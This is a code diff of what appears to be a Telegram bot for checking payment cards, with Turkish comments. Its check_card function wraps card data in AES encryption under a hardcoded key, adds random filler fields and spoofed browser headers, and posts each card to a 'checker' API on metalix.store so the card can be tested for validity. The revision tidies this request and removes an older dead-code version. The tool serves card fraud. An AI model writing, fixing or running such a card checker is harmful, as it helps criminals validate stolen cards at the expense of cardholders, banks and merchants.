@@ -32,33 +32,42 @@ def send_to_webhook(content, webhook_url):
 def check_card(card):
     try:
         AES_KEY = b"eonxsIYALqWz3nFG"
-        random_hex_value = ''.join(random.choice('0123456789abcdef') for _ in range(1500 * 2))
-        combined = f"{random_hex_value}:{card}"
-        
-        cipher = AES.new(AES_KEY, AES.MODE_ECB)
-        encrypted_card = cipher.encrypt(pad(combined.encode(), AES.block_size))
-        encrypted_card_b64 = base64.b64encode(encrypted_card).decode()
 
-        verification_key = "verification_" + ''.join(random.choice('0123456789abcdef') for _ in range(70 * 2))
-        verification_value = ''.join(random.choice('0123456789abcdef') for _ in range(1500 * 2))
+        # 1. Kartı hazırlıyoruz
+        random_hex_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))  # 1500*2
+        combined = f"{random_hex_value}:{card}"
+
+        cipher = AES.new(AES_KEY, AES.MODE_ECB)
+        encrypted_data = cipher.encrypt(pad(combined.encode(), AES.block_size))
+        encrypted_card = base64.b64encode(encrypted_data).decode()
+
+        # 2. Rastgele verification parametresi oluşturuyoruz
+        verification_key = "verification_" + ''.join(random.choice('0123456789abcdef') for _ in range(140))  # 70*2
+        verification_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))
+
+        # 3. coco değeri
         coco_value = str((random.randint(100000000, 9999999999) + random.randint(100000000, 9999999999)) * 31)
 
+        # 4. Headers
         headers = {
             'accept': '*/*',
             'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
             'origin': 'https://metalix.store',
             'referer': 'https://metalix.store/',
-            'user-agent': 'Mozilla/5.0',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
             'x-coco': coco_value
         }
 
+        # 5. Form-Data
         files = {
-            'card': (None, encrypted_card_b64),
+            'card': (None, encrypted_card),
             verification_key: (None, verification_value),
             'coco': (None, coco_value)
         }
 
-        response = requests.post("https://metalix.store/api/uts/api.php", headers=headers, files=files, timeout=15)
+        # 6. POST isteği
+        response = requests.post("https://metalix.store/api/uts/api.php", headers=headers, files=files, timeout=20)
+
         if response.status_code == 200:
             decrypted_data = AES.new(AES_KEY, AES.MODE_ECB).decrypt(base64.b64decode(response.text.strip()))
             decrypted_response = unpad(decrypted_data, AES.block_size).decode()
@@ -67,21 +76,6 @@ def check_card(card):
             return {"message": f"Hata HTTP {response.status_code}"}
     except Exception as e:
         return {"message": f"❌ API Hatası: {str(e)}"}
-
-        headers = {
-            "accept": "*/*",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://metalix.store",
-            "referer": "https://metalix.store/checker/",
-            "user-agent": "Mozilla/5.0"
-        }
-
-        data = f"card={card}&api_key=supersecret"
-        res = requests.post(API_URL, headers=headers, data=data, timeout=10)
-
-        return res.json()  # <- BU SATIR ÇOK ÖNEMLİ
-    except Exception:
-        return "❌ API Hatası: Bağlantı sağlanamadı veya zaman aşımı."
 
 
 @bot.message_handler(commands=['check'])
